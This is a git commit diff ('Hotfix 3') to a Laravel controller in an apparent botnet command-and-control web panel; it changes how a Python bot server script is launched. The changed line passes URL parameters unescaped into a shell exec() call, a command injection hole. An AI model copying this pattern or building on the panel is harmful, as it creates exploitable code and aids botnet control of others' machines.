adf5eb54568188397154a49b62497d90c99f7ae9
lululufr <lucas.lm.miller@gmail.com>
2024-07-02 23:17:50 +0200

    Hotfix 3

--- botnet-web/app/Http/Controllers/BotnetController.php
+++ botnet-web/app/Http/Controllers/BotnetController.php
@@ -244,7 +244,7 @@ class BotnetController extends Controller
     public function command($uid, $value){
         $path = env('PATH_PYTHON_EXECUTABLE');
 
-        $command = "nohup ".$path."PA-BOTNET-PYSRV/venv/bin/python3 ".$path."PA-BOTNET-PYSRV/main.py --command --value ".$value." --host ".$uid." > /dev/null 2>&1 & echo $!";
+        $command = $path."PA-BOTNET-PYSRV/venv/bin/python3 ".$path."PA-BOTNET-PYSRV/main.py --command --value ".$value." --host ".$uid;
         exec($command, $output, $return);
 
         return $output;
